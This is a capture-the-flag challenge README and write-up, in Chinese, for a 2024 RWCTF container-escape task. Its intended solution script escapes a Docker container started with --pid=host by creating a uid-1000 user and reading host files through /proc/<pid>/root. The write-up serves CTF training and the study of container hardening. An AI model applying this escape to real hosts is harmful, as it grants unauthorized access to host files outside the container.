## About

这是2024年第六届RWCTF体验赛的容器逃逸题目

## Description of the challenge

Pwn, difficulty:Normal

Escape, Escape, Escape, Escape !

`nc 47.96.250.76 6666`

## Witeup 

这个题目的出题思路来自于这篇[文章][1]。选手成功通过 ssh 成功连接上环境后，会发现这是一个容器环境，而且通过 `ps -aux` 命令能看到这个容器的启动命令：

```bash
1000        1113  0.0  0.0   6188   992 pts/0    S+   06:25   0:00 sleep 10000
1000        1114  0.0  2.3 1180376 23264 pts/0   Sl+  06:25   0:00 docker run --rm -it --pid=host --security-opt=apparmor=unconfined ubuntu bash
```

可以发现该容器共享了 pid， 因此能通过 ps命令看到容器外的进程。此外还有一个 uid 为 1000 的 sleep 进程。 预期解法如下：

```bash
#!/bin/sh

pid=$(pidof sleep)
useradd -u 1000 user

su user -c "cat /proc/$pid/root/flag1"

创建一个 uid 为 1000 的用户， 然后通过读 sleep 进程下的 /proc/$PID/root 的文件就能读到 flag
```

## Deploy

题目部署脚本相关可以参考 [deploy][2] 文件夹

## Reference Link

[1]: https://www.anquanke.com/post/id/290540	"一个未公开的容器逃逸方式"
[2]: ./deploy	"题目部署脚本"
